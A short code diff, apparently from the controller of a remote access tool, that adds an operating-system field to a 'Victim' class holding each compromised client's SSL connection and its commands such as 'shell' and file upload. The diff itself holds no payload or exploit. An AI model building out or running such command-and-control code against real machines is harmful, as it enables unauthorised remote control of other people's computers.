@@ -6,13 +6,15 @@ class Victim:
     conn: ssl.SSLSocket
     ip: str
     port: int
+    system: str
     commands: dict
 
-    def __init__(self, client_id: str, conn: ssl.SSLSocket, addr: tuple):
+    def __init__(self, client_id: str, conn: ssl.SSLSocket, addr: tuple, system: str):
         self._id = client_id
         self.conn = conn
         self.ip = addr[0]
         self.port = addr[1]
+        self.system = system
         self.commands = {
             "ping": self.__ping,
             "shell": self.__shell,
@@ -198,4 +200,4 @@ upload\t\t- Upload a file to remote client
         return True
 
     def __str__(self):
-        return f"{self.ip}:{self.port}"
+        return f"{self.ip}:{self.port}\t{self.system}"
